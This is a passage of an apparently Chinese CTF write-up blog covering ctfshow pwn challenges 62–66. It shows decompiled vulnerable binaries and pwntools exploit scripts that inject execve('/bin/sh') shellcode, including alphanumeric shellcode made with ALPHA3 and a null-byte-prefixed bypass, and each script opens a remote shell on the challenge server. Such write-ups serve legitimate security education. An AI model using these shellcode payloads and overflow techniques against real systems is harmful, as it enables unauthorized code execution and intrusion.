p=remote(&quot;pwn.challenge.ctf.show&quot;,28188)

shellcode =b&quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05&quot;# 22bytes

p.recvuntil(&quot;What's this : [&quot;)

v5=int(p.recv(14),16)

print(&quot;shellcode:&quot;,len(shellcode))
print(&quot;v5:&quot;,hex(v5))

p.recvuntil(&quot;But how to use it?\n&quot;)

payload1=b&quot;a&quot;*24+p64(v5+32)+shellcode

p.sendline(payload1)

p.interactive()

</code></pre>
<h1 id="pwn63shellcode"><a class="anchor" href="#pwn63shellcode">#</a> pwn63(shellcode)</h1>
<h2 id="题目-6"><a class="anchor" href="#题目-6">#</a> 题目</h2>
<p>题目描述： <code>又短了一点</code></p>
<pre><code>Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX disabled
PIE:      PIE enabled
RWX:      Has RWX segments
</code></pre>
<figure class="highlight c"><figcaption data-lang="c"><span>c</span></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>  FILE <span class="token operator">*</span>v3<span class="token punctuation">;</span> <span class="token comment">// rdi</span></pre></td></tr><tr><td data-num="4"></td><td><pre>  __int64 buf<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-10h] BYREF</span></pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre>  buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>  buf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>  v3 <span class="token operator">=</span> _bss_start<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>  <span class="token function">setvbuf</span><span class="token punctuation">(</span>_bss_start<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>  <span class="token function">logo</span><span class="token punctuation">(</span>v3<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Welcome to CTFshow!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"What's this : [%p] ?\n"</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Maybe it's useful ! But how to use it?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x37uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>这次 0x37 字节，上面的 exp 仍然能满足</p>
<figure class="highlight python"><figcaption data-lang="python"><span>n</span></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">#context.log_level = 'debug'</span></pre></td></tr><tr><td data-num="4"></td><td><pre>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'i386'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre>p<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"pwn.challenge.ctf.show"</span><span class="token punctuation">,</span><span class="token number">28213</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre>shellcode <span class="token operator">=</span><span class="token string">b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05"</span><span class="token comment"># 22bytes</span></pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"What's this : ["</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre>v5<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"shellcode:"</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"v5:"</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>v5<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre></pre></td></tr><tr><td data-num="16"></td><td><pre>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"But how to use it?\n"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="17"></td><td><pre></pre></td></tr><tr><td data-num="18"></td><td><pre>payload1<span class="token operator">=</span><span class="token string">b"a"</span><span class="token operator">*</span><span class="token number">24</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>v5<span class="token operator">+</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token operator">+</span>shellcode</pre></td></tr><tr><td data-num="19"></td><td><pre>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="20"></td><td><pre></pre></td></tr><tr><td data-num="21"></td><td><pre>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr></table></figure><h1 id="pwn64shellcode"><a class="anchor" href="#pwn64shellcode">#</a> pwn64(shellcode)</h1>
<h2 id="题目-7"><a class="anchor" href="#题目-7">#</a> 题目：</h2>
<p>题目描述： <code>有时候开启某种保护并不代表这条路不通</code></p>
<pre><code>Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
</code></pre>
<p>32 位程序，开启了 NX</p>
<p><code>main:</code></p>
<figure class="highlight c"><figcaption data-lang="c"><span>c</span></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>  <span class="token keyword">void</span> <span class="token operator">*</span>buf<span class="token punctuation">;</span> <span class="token comment">// [esp+8h] [ebp-10h]</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>  buf <span class="token operator">=</span> <span class="token function">mmap</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x400u</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">34</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>  <span class="token function">alarm</span><span class="token punctuation">(</span><span class="token number">0xAu</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>  <span class="token function">setvbuf</span><span class="token punctuation">(</span>_bss_start<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Some different!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x400u</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre>  <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Illegal entry!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>  <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">)</span>buf<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>这里调用了一个 <code>mmap函数</code> ，进行内存映射，并且其有执行权限（7），将其地址给 buf，后面调用 read 函数可以写入数据到 buf，当 read&gt;0 时就会执行 buf</p>
<p>所以这里在 buf 里写入 shellcode 即可</p>
<figure class="highlight python"><figcaption data-lang="python"><span>n</span></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">#context.log_level = 'debug'</span></pre></td></tr><tr><td data-num="4"></td><td><pre>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'i386'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre>p<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"pwn.challenge.ctf.show"</span><span class="token punctuation">,</span><span class="token number">28112</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre>shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr></table></figure><h1 id="pwn65字符串显示的shellcode及汇编分析"><a class="anchor" href="#pwn65字符串显示的shellcode及汇编分析">#</a> pwn65（字符串显示的 shellcode 及汇编分析）</h1>
<h2 id="题目-8"><a class="anchor" href="#题目-8">#</a> 题目</h2>
<p>题目描述: <code>你是一个好人</code></p>
<p>64 位程序，开启了 IPE</p>
<pre><code>Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    No canary found
NX:       NX disabled
PIE:      PIE enabled
RWX:      Has RWX segments
</code></pre>
<p>反汇编失败</p>
<p>大概的执行逻辑：</p>
<p><img data-src="https://vvwwv.oss-cn-nanjing.aliyuncs.com/ctfshow/VI1WO8%7B%60P6R5MZJJVKI9%40Z9.png" alt="" /></p>
<p><code>[rbp+var_4]</code>  是存放当前比较字符串的偏移值， <code>[rbp+var_4]</code>  存放字符串的总长度，这里 eax 存放读入的长度是通过 gdb 调试得出：</p>
<p>输入了字符串 <code>aaa</code>  后变成了 4（ <code>aaa\n</code> ）</p>
<p><img data-src="https://vvwwv.oss-cn-nanjing.aliyuncs.com/ctfshow/PTW%5B6%25_BY0B2%5D1CKWX55%7EED.png" alt="" /></p>
<p>逻辑上判断是否是在 <code>0x61~0x7A(a-z)</code> , 再判断 <code>0x41~0x5A（A-Z）</code> ， <code>0x30~0x5a(0-Z)</code>  所以 shellcode 是需要由大小写字母及数字构成</p>
<p>利用 alpha3 生成</p>
<p><code>python ./ALPHA3.py x64 ascii mixedcase rax --input=&quot;shellcode&quot; &gt; mixedcase.txt</code>  这里的参数 rax 是需要填入执行 shellcode 的那个寄存器（call rax）</p>
<p>生成的 shellcode：</p>
<pre><code>shellcode=Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t
</code></pre>
<p>exp:</p>
<figure class="highlight python"><figcaption data-lang="python"><span>n</span></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="3"></td><td><pre>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre>e<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./pwn44'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre>p<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"pwn.challenge.ctf.show"</span><span class="token punctuation">,</span><span class="token number">28292</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre>shellcode<span class="token operator">=</span><span class="token string">"Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t"</span></pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr></table></figure><h1 id="pwn66-shellcode开头为x00"><a class="anchor" href="#pwn66-shellcode开头为x00">#</a> pwn66 (shellcode 开头为 <code>\x00</code> )</h1>
<h2 id="题目-9"><a class="anchor" href="#题目-9">#</a> 题目：</h2>
<p>题目描述： <code>简单的shellcode？不对劲，十分得有十二分的不对劲</code></p>
<p>64 位程序：</p>
<pre><code>Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
</code></pre>
<figure class="highlight c"><figcaption data-lang="c"><span>c</span></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>  _BYTE <span class="token operator">*</span>buf<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-8h]</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>  <span class="token function">init</span><span class="token punctuation">(</span>argc<span class="token punctuation">,</span> argv<span class="token punctuation">,</span> envp<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>  <span class="token function">logo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>  buf <span class="token operator">=</span> <span class="token function">mmap</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">0x1000uLL</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">34</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Your shellcode is :"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x200uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">check</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre>  <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">" ERROR !"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>  <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">(</span>__fastcall <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span>buf<span class="token punctuation">)</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>仍然是写入 shellcode，但是这里有一个 check：</p>
<figure class="highlight c"><figcaption data-lang="c"><span>c</span></figcaption><table><tr><td data-num="1"></td><td><pre>__int64 __fastcall <span class="token function">check</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span>a1<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>  _BYTE <span class="token operator">*</span>i<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-10h]</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token operator">*</span>a1 <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre>  <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token operator">&amp;</span>unk_400F20<span class="token punctuation">;</span> <span class="token operator">*</span>i <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span>i <span class="token operator">!=</span> <span class="token operator">*</span>a1<span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre>      <span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token operator">*</span>i <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre>      <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token operator">++</span>a1<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>  <span class="token keyword">return</span> <span class="token number">1LL</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>我们要使他返回 1 才能顺利执行 shellcode，所以要跳出循环，*a1=0 就可以跳出，所以我们的 shellcode 第一个字节要为 <code>\x00</code> ，利用脚本查找第一个字节为 <code>\x00</code>  的指令</p>
<figure class="highlight python"><figcaption data-lang="python"><span>n</span></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">from</span> itertools <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">import</span> re</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token keyword">for</span> j <span class="token keyword">in</span> product<span class="token punctuation">(</span><span class="token punctuation">[</span>p8<span class="token punctuation">(</span>k<span class="token punctuation">)</span> <span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span>repeat<span class="token operator">=</span>i<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#there are as well as  twice 'for()',it </span></pre></td></tr><tr><td data-num="8"></td><td><pre>        payload<span class="token operator">=</span><span class="token string">b'\x00'</span><span class="token operator">+</span><span class="token string">b""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>j<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre>        p<span class="token operator">=</span>disasm<span class="token punctuation">(</span>payload<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre>        <span class="token keyword">if</span><span class="token punctuation">(</span></pre></td></tr><tr><td data-num="11"></td><td><pre>            p <span class="token operator">!=</span><span class="token string">"    ..."</span> </pre></td></tr><tr><td data-num="12"></td><td><pre>            <span class="token keyword">and</span> <span class="token keyword">not</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r"\[\w*?\]"</span><span class="token punctuation">,</span>p<span class="token punctuation">)</span> </pre></td></tr><tr><td data-num="13"></td><td><pre>            <span class="token keyword">and</span> <span class="token string">".byte"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> p<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="14"></td><td><pre>            <span class="token keyword">print</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre>            <span class="token comment">#input()</span></pre></td></tr></table></figure><p><img data-src="https://vvwwv.oss-cn-nanjing.aliyuncs.com/%E5%9B%BE%E5%BA%8A/2%2486%60%40TG%7E9H6%25A8KY52GPXM.png" alt="" /></p>
<figure class="highlight python"><figcaption data-lang="python"><span>n</span></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">#context.log_level = 'debug'</span></pre></td></tr><tr><td data-num="4"></td><td><pre>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token comment">#p=process('./')</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token comment">#e=ELF('./')</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token comment">#p=remote('node4.buuoj.cn',28249)</span></pre></td></tr><tr><td data-num="8"></td><td><pre>p<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"pwn.challenge.ctf.show"</span><span class="token punctuation">,</span><span class="token number">28293</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre>shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'\x00'</span><span class="token operator">+</span><span class="token string">b'\xc0'</span><span class="token operator">+</span>shellcode<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="13"></td><td><pre>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr></table></figure><h1 